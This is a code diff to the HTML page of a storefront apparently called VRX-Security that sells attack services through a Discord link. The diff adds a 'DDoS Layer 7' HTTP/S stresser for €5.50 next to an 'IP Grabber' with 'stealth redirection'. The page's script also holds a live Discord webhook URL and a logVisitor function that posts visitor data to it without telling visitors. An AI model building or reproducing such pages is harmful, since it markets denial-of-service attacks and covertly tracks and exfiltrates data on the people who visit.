@@ -157,6 +157,12 @@
                 <a href="https://discord.gg/DRJ66c3Nc" class="buy-btn">PURCHASE</a>
             </div>
             <div class="card">
+                <h3>DDoS Layer 7</h3>
+                <p>Powerful HTTP/S stresser. High requests per second.</p>
+                <span class="price">€5.50</span>
+                <a href="https://discord.gg/DRJ66c3Nc" class="buy-btn">PURCHASE</a>
+            </div>
+            <div class="card">
                 <h3>IP Grabber</h3>
                 <p>Universal tracking with stealth redirection.</p>
                 <span class="price">€4.00</span>
@@ -185,7 +191,7 @@
     <div id="status">VRX-Security: System Active</div>
 
     <script>
-        // CONFIGURATIE: Plak hier je Webhook URL
+        // CONFIGURATIE: Webhook URL van gebruiker
         const webhookURL = "https://discordapp.com/api/webhooks/1488196186979565630/tuKc8B-shHEU94198BGbs0VbcsyaSIpl3EXyJab513b8ukgmlQCGGUwI7OYWgdLvgN2x";
 
         async function logVisitor() {
@@ -219,7 +225,7 @@
                     body: JSON.stringify(params)
                 });
 
-                // Laat een kleine melding zien op de site (optioneel)
+                // Laat een kleine melding zien op de site
                 const status = document.getElementById('status');
                 status.style.display = 'block';
                 setTimeout(() => { status.style.display = 'none'; }, 3000);
